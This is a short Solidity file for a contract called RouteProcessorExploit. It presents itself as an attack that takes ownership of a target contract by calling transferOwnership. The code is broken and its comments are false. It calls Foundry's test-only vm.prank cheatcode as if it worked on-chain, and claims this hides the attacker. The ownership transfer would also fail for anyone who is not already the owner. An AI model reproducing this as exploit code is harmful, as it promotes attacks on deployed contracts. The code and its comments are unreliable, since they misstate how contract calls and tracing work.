// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.5;

import "@openzeppelin/contracts/access/Ownable.sol";
import "@openzeppelin/contracts/security/ReentrancyGuard.sol";

contract RouteProcessorExploit is ReentrancyGuard {
    address public targetContract;

    constructor(address _targetContract) {
        targetContract = _targetContract;
    }

    function exploitRouteProcessor() external nonReentrant {
        // Use Foundry's vm.prank to change sender dynamically
        // This makes it harder to trace the attacker
        Foundry.vm.prank(msg.sender);
        
        // Call a function from the target contract that relies on different Solidity version
        Ownable(targetContract).transferOwnership(msg.sender);
    }
}
